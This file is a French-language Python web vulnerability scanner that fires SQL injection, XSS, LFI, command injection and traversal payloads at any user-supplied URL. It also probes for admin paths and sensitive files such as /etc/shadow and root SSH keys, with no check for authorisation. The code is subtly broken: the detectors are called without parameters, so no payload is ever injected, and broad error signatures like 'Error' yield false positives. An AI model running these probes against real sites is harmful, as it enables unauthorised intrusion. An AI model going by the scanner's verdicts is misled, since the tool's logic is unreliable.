import requests
import time
from urllib.parse import urlparse, urljoin

from colorama import Fore, Back, Style, init
import os

os.system('color 4')

menu = r"""
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}                
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
                                                              }@@@@  @@@@j J@@@>                          
                                                          ^a@@ _@@@@;_@@@@a }@@@>                         
                                                       ^} v@@@@^;@@@@@@@@@@@ >@@@v                        
                                                     |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                       
                                                  J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                       
                                               ; v@@@@ >@@@@@@@@@@@@@@@@j                                 
                                            ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                   
                                            a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>                  
                                    ╔════════════════════════════════════════╗
                                    ║ Analyseur Les vulnérabilités D'un Site ║
                                    ╚════════════════════════════════════════╝                                                              
"""

print(menu)

sql_payloads = [
    "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
    "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
    "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
    "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
    "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
    "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
    "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
]

xss_payloads = [
    "<script>alert('XssFoundByMC')</script>", "<img src=x onerror=alert('XssFoundByMC')>", "<body onload=alert('XssFoundByMC')>", 
    "<svg/onload=alert('XssFoundByMC')>", "javascript:alert('XssFoundByMC')", "<iframe src='javascript:alert(\"XssFoundByMC\")'></iframe>", 
    "<input type=\"text\" onfocus=\"alert('XssFoundByMC')\">", "<link rel=\"stylesheet\" href=\"javascript:alert('XssFoundByMC');\">",
    "<a href=\"javascript:alert('XssFoundByMC')\">Click me</a>", "<form action=\"javascript:alert('XssFoundByMC')\"><input type=submit>",
    "'\"><script>alert('XssFoundByMC')</script>", "'><img src=x onerror=alert('XssFoundByMC')>", "<object data='javascript:alert(\"XssFoundByMC\")'></object>",
    "<embed src='data:text/html,<script>alert(\"XssFoundByMC\")</script>'>"
]

lfi_payloads = [
    "../../etc/passwd", "../../proc/self/environ", "/etc/passwd", "../../../../../../etc/passwd"
]

cmd_injection_payloads = [
    "; ls", "| ls", "& ls", "; uname -a", "| uname -a", "& uname -a"
]

dir_traversal_payloads = [
    "../../", "../../../", "../../../../", "/etc/", "/usr/", "/var/"
]

error_signatures = [
    "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
    "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
    "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
    "You have an error in your SQL syntax", "Incorrect syntax near", 
    "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
]

interesting_paths = [
    "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
    "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
    "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
    "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
    "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
    "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
    "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
    "server-status", "server-status", "server-status/", "server-status/index.html",
    "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
]

sensitive_files = [
    "etc/passwd", "etc/password", "etc/ip", "etc/passwords", "etc/ips", "etc/shadow", "etc/group",
    "etc/hosts", "etc/hostname", "etc/network/interfaces",
    "etc/sysconfig/network", "etc/sysconfig/network-scripts/ifcfg-*", "etc/fstab",
    "etc/resolv.conf", "etc/issue", "etc/motd",
    "etc/apt/sources.list", "etc/yum.conf", "etc/sudoers",
    "passwd", "password", "ip", "passwords", "ips", "shadow", "group",
    "hosts", "hostname", "network/interfaces",
    "sysconfig/network", "sysconfig/network-scripts/ifcfg-*", "fstab",
    "resolv.conf", "issue", "motd",
    "apt/sources.list", "yum.conf", "sudoers",
    "var/log/auth.log", "var/log/syslog", "var/log/messages",
    "var/log/dmesg", "var/log/secure", "var/log/maillog",
    "var/log/httpd/access_log", "var/log/httpd/error_log", "var/log/apache2/access.log",
    "var/log/apache2/error.log", "var/log/nginx/access.log", "var/log/nginx/error.log",
    "root/.bash_history", "root/.ssh/authorized_keys", "root/.ssh/id_rsa",
    "root/.ssh/id_rsa.pub", "root/.ssh/known_hosts", "home/user/.bash_history",
    "home/user/.ssh/authorized_keys", "home/user/.ssh/id_rsa", "home/user/.ssh/id_rsa.pub",
    "home/user/.ssh/known_hosts", "www/html/config.php", "www/html/wp-config.php",
    "www/html/.htaccess", "www/html/.env", "opt/lampp/etc/my.cnf",
    "opt/lampp/htdocs/index.php", "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/grub.cfg",
    "boot/grub/menu.lst", "proc/self/environ", "proc/version",
    "proc/cmdline", "proc/mounts", "proc/net/arp",
    "proc/net/tcp", "proc/net/udp", "proc/net/fib_trie"
]

sql_vuln_detected = False
xss_vuln_detected = False
interesting_paths_found = False
sensitive_files_found = False
lfi_vuln_detected = False
cmd_injection_detected = False
dir_traversal_detected = False

def validate_url(url):
    try:
        parsed_url = urlparse(url)
        if not all([parsed_url.scheme, parsed_url.netloc]):
            raise ValueError("URL invalide : doit contenir le schéma et le domaine")
        return True
    except ValueError as e:
        print(f"[X] Erreur de validation de l'URL : {e}")
        return False

def send_request(url, params=None, method="GET", data=None):
    if not validate_url(url):
        return None
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept-Language': 'fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3',
        'Connection': 'close',
    }
    
    try:
        if method == "GET":
            return requests.get(url, params=params, headers=headers)
        elif method == "POST":
            return requests.post(url, data=data, headers=headers)
        else:
            raise ValueError("Méthode non supportée : " + method)
    except requests.exceptions.RequestException as e:
        print(f"[X] Erreur lors de la requête : {e}")
        return None

def detect_sql_injection(url, params=None, method="GET", data=None):
    global sql_vuln_detected
    sql_vuln_detected = False
    
    for payload in sql_payloads:
        test_params = {param: payload for param in params} if params else None
        test_data = {param: payload for param in data} if data else None
        
        try:
            response = send_request(url, params=test_params, method=method, data=test_data)
            if response and any(signature in response.text for signature in error_signatures):
                print(f"[!] Vulnérabilité SQL détectée avec la charge utile : {payload}")
                sql_vuln_detected = True
        except Exception as e:
            print(f"[X] Erreur lors du test SQL : {e}")

def detect_xss(url, params=None, method="GET", data=None):
    global xss_vuln_detected
    xss_vuln_detected = False
    
    for payload in xss_payloads:
        test_params = {param: payload for param in params} if params else None
        test_data = {param: payload for param in data} if data else None
        
        try:
            response = send_request(url, params=test_params, method=method, data=test_data)
            if response and payload in response.text:
                print(f"[!] Vulnérabilité XSS détectée avec la charge utile : {payload}")
                xss_vuln_detected = True
        except Exception as e:
            print(f"[X] Erreur lors du test XSS : {e}")

def detect_lfi(url, params=None, method="GET", data=None):
    global lfi_vuln_detected
    lfi_vuln_detected = False
    
    for payload in lfi_payloads:
        test_params = {param: payload for param in params} if params else None
        test_data = {param: payload for param in data} if data else None
        
        try:
            response = send_request(url, params=test_params, method=method, data=test_data)
            if response and ("root:x:" in response.text or "/etc/passwd" in response.text):
                print(f"[!] Vulnérabilité LFI détectée avec la charge utile : {payload}")
                lfi_vuln_detected = True
        except Exception as e:
            print(f"[X] Erreur lors du test LFI : {e}")

def detect_cmd_injection(url, params=None, method="GET", data=None):
    global cmd_injection_detected
    cmd_injection_detected = False
    
    for payload in cmd_injection_payloads:
        test_params = {param: payload for param in params} if params else None
        test_data = {param: payload for param in data} if data else None
        
        try:
            response = send_request(url, params=test_params, method=method, data=test_data)
            if response and (("uid=" in response.text) or ("id=" in response.text)):
                print(f"[!] Vulnérabilité Command Injection détectée avec la charge utile : {payload}")
                cmd_injection_detected = True
        except Exception as e:
            print(f"[X] Erreur lors du test Command Injection : {e}")

def detect_dir_traversal(url, params=None, method="GET", data=None):
    global dir_traversal_detected
    dir_traversal_detected = False
    
    for payload in dir_traversal_payloads:
        test_params = {param: payload for param in params} if params else None
        test_data = {param: payload for param in data} if data else None
        
        try:
            response = send_request(url, params=test_params, method=method, data=test_data)
            if response and ("root:x:" in response.text or "/etc/passwd" in response.text):
                print(f"[!] Vulnérabilité Directory Traversal détectée avec la charge utile : {payload}")
                dir_traversal_detected = True
        except Exception as e:
            print(f"[X] Erreur lors du test Directory Traversal : {e}")

def check_for_interesting_paths(url):
    global interesting_paths_found
    interesting_paths_found = False
    
    for path in interesting_paths:
        full_url = urljoin(url, path)
        try:
            response = send_request(full_url)
            if response and response.status_code == 200:
                print(f"[!] Chemin intéressant trouvé : {full_url}")
                interesting_paths_found = True
        except Exception as e:
            print(f"[X] Erreur lors de la vérification des chemins intéressants : {e}")

def check_for_sensitive_files(url):
    global sensitive_files_found
    sensitive_files_found = False
    
    for file in sensitive_files:
        full_url = urljoin(url, file)
        try:
            response = send_request(full_url)
            if response and response.status_code == 200:
                print(f"[!] Fichier sensible trouvé : {full_url}")
                sensitive_files_found = True
        except Exception as e:
            print(f"[X] Erreur lors de la vérification des fichiers sensibles : {e}")

def run_tests(url):
    print(f"Début des tests sur : {url}")
    
    print("\n[SQL Injection] Tests en cours...")
    detect_sql_injection(url)
    if sql_vuln_detected:
        print("[*] Test SQL fini : Vulnérabilités détectées.")
    else:
        print("[*] Test SQL fini : Aucune vulnérabilité détectée.")
    
    print("\n[XSS] Tests en cours...")
    detect_xss(url)
    if xss_vuln_detected:
        print("[*] Test XSS fini : Vulnérabilités détectées.")
    else:
        print("[*] Test XSS fini : Aucune vulnérabilité détectée.")
    
    print("\n[LFI] Tests en cours...")
    detect_lfi(url)
    if lfi_vuln_detected:
        print("[*] Test LFI fini : Vulnérabilités détectées.")
    else:
        print("[*] Test LFI fini : Aucune vulnérabilité détectée.")
    
    print("\n[Command Injection] Tests en cours...")
    detect_cmd_injection(url)
    if cmd_injection_detected:
        print("[*] Test Command Injection fini : Vulnérabilités détectées.")
    else:
        print("[*] Test Command Injection fini : Aucune vulnérabilité détectée.")
    
    print("\n[Directory Traversal] Tests en cours...")
    detect_dir_traversal(url)
    if dir_traversal_detected:
        print("[*] Test Directory Traversal fini : Vulnérabilités détectées.")
    else:
        print("[*] Test Directory Traversal fini : Aucune vulnérabilité détectée.")
    
    print("\n[Chemins intéressants] Vérification en cours...")
    check_for_interesting_paths(url)
    if interesting_paths_found:
        print("[*] Vérification des chemins intéressants fini : Chemins trouvés.")
    else:
        print("[*] Vérification des chemins intéressants fini : Aucun chemin trouvé.")
    
    print("\n[Fichiers sensibles] Vérification en cours...")
    check_for_sensitive_files(url)
    if sensitive_files_found:
        print("[*] Vérification des fichiers sensibles fini : Fichiers trouvés.")
    else:
        print("[*] Vérification des fichiers sensibles fini : Aucun fichier trouvé.")

if __name__ == "__main__":
    target_url = input("Entrez l'URL à analyser : ")
    if validate_url(target_url):
        run_tests(target_url)
    else:
        print("[X] URL invalide. Veuillez entrer une URL correcte.")
